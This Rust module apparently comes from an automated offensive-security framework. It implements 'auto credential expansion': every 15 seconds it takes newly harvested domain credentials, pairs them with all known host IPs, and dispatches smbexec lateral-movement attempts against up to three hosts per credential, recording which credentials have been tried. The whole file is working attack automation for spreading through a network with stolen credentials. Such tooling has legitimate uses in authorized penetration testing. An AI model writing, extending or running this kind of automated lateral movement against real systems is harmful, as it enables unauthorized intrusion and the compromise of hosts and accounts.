//! auto_credential_expansion -- lateral movement with new creds.

use std::sync::Arc;
use std::time::Duration;

use crate::dispatcher::Dispatcher;
use crate::state::*;
use tokio::sync::watch;

/// Monitors for new credentials and dispatches lateral movement tasks.
/// Interval: 15s. Matches Python `_auto_credential_expansion`.
pub async fn auto_credential_expansion(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(15));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let work: Vec<(String, ares_core::models::Credential, Vec<String>)> = {
            let state = dispatcher.state.read().await;
            state
                .credentials
                .iter()
                .filter(|c| !c.domain.is_empty())
                .filter_map(|cred| {
                    let dedup = format!(
                        "{}:{}",
                        cred.domain.to_lowercase(),
                        cred.username.to_lowercase()
                    );
                    if state.is_processed(DEDUP_EXPANSION_CREDS, &dedup) {
                        return None;
                    }
                    // Get target IPs for this domain
                    let targets: Vec<String> = state.hosts.iter().map(|h| h.ip.clone()).collect();
                    if targets.is_empty() {
                        return None;
                    }
                    Some((dedup, cred.clone(), targets))
                })
                .take(3)
                .collect()
        };

        for (dedup_key, cred, targets) in work {
            // Try smbexec/wmiexec on first few targets
            let mut dispatched = false;
            for target_ip in targets.iter().take(3) {
                if let Ok(Some(_)) = dispatcher
                    .request_lateral(target_ip, &cred, "smbexec")
                    .await
                {
                    dispatched = true;
                }
            }

            if dispatched {
                dispatcher
                    .state
                    .write()
                    .await
                    .mark_processed(DEDUP_EXPANSION_CREDS, dedup_key.clone());
                let _ = dispatcher
                    .state
                    .persist_dedup(&dispatcher.queue, DEDUP_EXPANSION_CREDS, &dedup_key)
                    .await;
            }
        }
    }
}
